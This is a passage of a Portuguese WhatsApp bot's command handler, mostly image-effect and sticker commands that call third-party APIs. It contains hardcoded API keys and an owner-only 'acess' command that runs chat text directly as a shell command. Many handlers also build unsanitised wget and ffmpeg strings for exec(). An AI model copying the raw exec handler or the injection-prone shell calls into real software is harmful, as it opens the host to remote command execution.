exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else if ((isMedia && msg.message.videoMessage.seconds < 11 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
rano = getRandom('.webp')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('Bot', 'Ale')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
enviar(`Falha na conversão de ${tipe} para sticker`)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar(`Você precisa enviar ou marcar uma imagem ou vídeo`)
}
break  */           
case 'smeme': 
case 'stickmeme':
gh = body.slice(7)           
var top = gh.split('/')[0]
var bottom = gh.split('/')[1]
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg 
owgi = await  tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
sendStickerFromUrl(from, `${anu1}`)
} else {
enviar('Use fotos/adesivos!')
}
break
case 'figulgbt':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-exteam.herokuapp.com/api/rainbow?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (`DEU ERROR ??`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {
quoted: msg
})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break

case 'figuc':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-exteam.herokuapp.com/api/circle?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {
quoted: msg
})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break                             
case 'tapa':

if (!isGroup) return enviar('só grupo 🤡')
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
const shino = fs.readFileSync('./assets/tapa.mp4')
tomioka.sendMessage(from, shino, MessageType.video, {
mimetype: 'video/gif',
quoted: tomio, contextInfo: tome,
caption: `Você acabou de dar um tapa na raba da😏 @${mentioned[0].split('@')[0]}`
})
break     
case 'borra':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/pixelate?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {
quoted: msg
})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break              
case 'florest':            

if (args.length < 1) return enviar (mess.blank)
teks = body.slice(8)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/nature-3d?teks=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: '*prontinho*'})
break
case 'bot2':

enviar('http://wa.me/994400733887')
break
case 'lolkey':

case 'cekapikey':


if (args.length < 1) return enviar(`Modelo ${prefix}sua key`) 

anu = await fetchJson(`https://lolhuman.herokuapp.com/api/checkapikey?apikey=${q}`)

teks = `*SUA CHAVE API * \ n \ e➸ nome de usuário= ${anu.result.username}\n➸ Solicitar= ${anu.result.requests}\n➸ Hoje= ${anu.result.today}\n➸ tipo de conta= ${anu.result.account_type}\n➸ Expirado= ${anu.result.expired}\n➸ API = https://lolhuman.herokuapp.com`

tomioka.sendMessage(from, teks, text, {quoted: tomio, contextInfo: tome})

break
case 'joke':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu8 = (`https://lolhuman.herokuapp.com/api/creator1/jokeOverHead?apikey=genbotkey&img=${teks}`)
abc = await getBuffer(anu8)
tomioka.sendMessage(from, abc, image, {
quoted: msg
})
} else {
enviar('É necessário usar uma imagem')
}
break
case 'animerosto':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu8 = (`https://lolhuman.herokuapp.com/api/creator1/facepalm?apikey=genbotkey&img=${teks}`)
abc = await getBuffer(anu8)
tomioka.sendMessage(from, abc, image, {
quoted: msg
})
} else {
enviar('É necessário usar uma imagem')
}
break                                                 
case 'quadro':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu8 = (`https://lolhuman.herokuapp.com/api/creator1/beautiful?apikey=genbotkey&img=${teks}`)
abc = await getBuffer(anu8)
tomioka.sendMessage(from, abc, image, {
quoted: msg
})
} else {
enviar('É necessário usar uma imagem')
}
break 
case 'afetar':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu8 = (`https://lolhuman.herokuapp.com/api/creator1/affect?apikey=genbotkey&img=${teks}`)
abc = await getBuffer(anu8)
tomioka.sendMessage(from, abc, image, {
quoted: msg
})
} else {
enviar('É necessário usar uma imagem')
}
break  
case 'flower':    

if (!isPremium) return enviar (`Você não é um Membro Premium, entre em contato com o proprietário ou digite *${prefix}compras* para adquirir o acesso ` ,text, { contextInfo: null, quoted: tomio, contextInfo: tome})
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(8)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://api.zeks.xyz/api/flowertext?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'tai'})
break
case 'lighttxt':       
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(9)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://api.zeks.xyz/api/glowtext?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'tai'})
break                                                                    
case 'procurado':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-exteam.herokuapp.com/api/procurado?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {
quoted: msg
})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'ppt':

ppt = ["pedra","papel","tesoura"]
ppy = ppt[Math.floor(Math.random() * ppt.length)]
ppg = Math.floor(Math.random() * 13) + 349
pptb = ppy
pph = `Você ganhou ${ppg} em xp`
if ((pptb == "pedra" && args == "papel") || 
(pptb == "papel" && args == "tesoura") || 
(pptb == "tesoura" && args == "pedra")) {
var vit = "vitoria"
} else if ((pptb == "pedra" && args == "tesoura") || 
(pptb == "papel" && args == "pedra") || 
(pptb == "tesoura" && args == "papel")) {
var vit = "derrota"
} else if ((pptb == "pedra" && args == "pedra") ||
(pptb == "papel" && args == "papel") ||
(pptb == "tesoura" && args == "tesoura")) {
var vit = "empate"
} else if (vit = "undefined") {
return enviar ('escolha o que quer jogar\n(-ppt pedra)\n(-ppt papel)\n(-ppt tesoura)')
}
if (vit == "vitoria") {
var tes = "Vitória do jogador"
}
if (vit == "derrota" ) {
var tes = "A vitória é do TOMIOKA-BOT"
}
if (vit == "empate" ) {
var tes = "O jogo terminou em empate"
}
enviar(`TOMIOKA-BOT jogou: ${pptb}\nO jogador jogou: ${args}\n\n${tes}`)
addLevelingXp(sender, ppg)
if (tes == "Vitória do jogador") {
enviar(pph)
}
break
case 'wasted':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-exteam.herokuapp.com/api/wasted?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {
quoted: msg
})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break                  
case 'metadinha':

enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/ppcouple?apikey=dappakntlll`) 
cowo = await getBuffer(anu.result.male)
tomioka.sendMessage(from, cowo, image, {quoted: tomio, contextInfo: tome})
cewe = await getBuffer(anu.result.female)
tomioka.sendMessage(from, cewe, image, {quoted: tomio, contextInfo: tome})
break
case 'gtav':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/gtav?url=${imgtrg}`)
if (anu1.error) return enviar("Não consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'zombie':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://jonaz-api-v2.herokuapp.com/zombie?url=${imgtrg}`)
if (anu1.error) return enviar("Não consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.resultado)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'firef':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/fireAnimation?url=${imgtrg}`)
if (anu1.error) return enviar("Não consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'vidroqb':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/brokemirror?url=${imgtrg}`)
if (anu1.error) return enviar("Não consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'arteft':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/artePhoto?url=${imgtrg}`)
if (anu1.error) return enviar("Não consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case '2arma':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`http://brizas-api.herokuapp.com/photooxy/v2/crossgun?apikey=brizaloka&img=${imgtrg}`)
if (anu1.error) return enviar("Não consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.resultado)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'armast':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`http://brizas-api.herokuapp.com/photooxy/v2/gunscircle?apikey=brizaloka&text=Bandido(a)&text2=da área&img=${imgtrg}`)
if (anu1.error) return enviar("Não consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.resultado)
tomioka.sendMessage(from, nobg, image, {quoted: msg})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'effect':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://leyscoders-api.herokuapp.com/api/imgmaker/firework?url=${imgtrg}&apikey=dappakntlll`)
if (anu1.error) return enviar("Não consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, video, {quoted: msg, mimetype: 'video/mp4'})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break

case 'paisagem':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/mixGalaxy?url=${imgtrg}`)
if (anu1.error) return enviar("Não consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'acess':
if (!isOwner) return enviar(mess.only.ownerB)
teks = body.slice(7)
exec(teks, (err, stdout) => {
if (err) return tomioka.sendMessage(from, `root@ALEATORY-BOT:~ ${err}`, text, { quoted: msg })
if (stdout) {
tomioka.sendMessage(from, stdout, text)
}
})
break
case 'cubof':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/cuboFoto1?url=${imgtrg}`)
if (anu1.error) return enviar("Não consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'wallimg':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`http://brizas-api.herokuapp.com/photooxy/v2/phonewallpaper?apikey=brizaloka&img=${imgtrg}`)
if (anu1.error) return enviar("Não consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.resultado)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'qbcabeca':
case 'qbcabeça':  
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/puzzle?url=${imgtrg}`)
if (anu1.error) return enviar("Não consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'arma':
case 'figuarma':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
lfy = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${lfy.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-exteam.herokuapp.com/api/gun?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
break
case 'sc':
case 'stcirculo':
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
fgh = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${fgh.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-exteam.herokuapp.com/api/circle?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg
})
fs.unlinkSync(rano)
})
} else {
enviar('Você precisa marcar ou enviar uma imagem para isso')
}
await limitAdd(sender)
break
case 'hitler':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
